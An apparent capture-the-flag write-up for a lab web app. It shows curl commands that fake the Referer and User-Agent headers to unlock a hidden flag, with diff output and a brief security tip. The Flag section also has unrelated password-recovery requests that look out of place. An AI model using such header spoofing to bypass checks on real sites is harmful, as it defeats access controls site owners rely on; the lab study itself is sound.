# Fake headers

__http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f__

## Description
There are a lot of comments in the html. One of them is 
```
<!--
You must come from : "https://www.nsa.gov/".
-->
```

## Form Outputs
Let's try to request

```
curl http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -s -o nohead.html
curl http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -H "Referer: https://www.nsa.gov/" -s -o head.html
diff nohead.html head.html 
```
We get the following rows
```
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```
We see FIRST STEP DONE

## Flag
Let's use the next comment:
```
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```
We see ft_bornToSec header. We can use that for header
```
curl -s 'http://192.168.99.101/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o webmaster.html
curl -s 'http://192.168.99.101/?page=recover' --data 'mail=krasty%40lnoisome.com&Submit=Submit' -o krasty.html
diff webmaster.html krasty.html 
```
Inside the diff output html we get the flag
```
curl 'http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o head.html
diff nohead.html head.html | grep flag
```
The output is with the flag

## Safety
Use Secure Protocols and Headers: Employ HTTPS/TLS for secure communication between the server and the user's browser. Additionally, be mindful of headers such as "Referer" and "User-Agent" and utilize them correctly to ensure the desired behavior and security of your application.
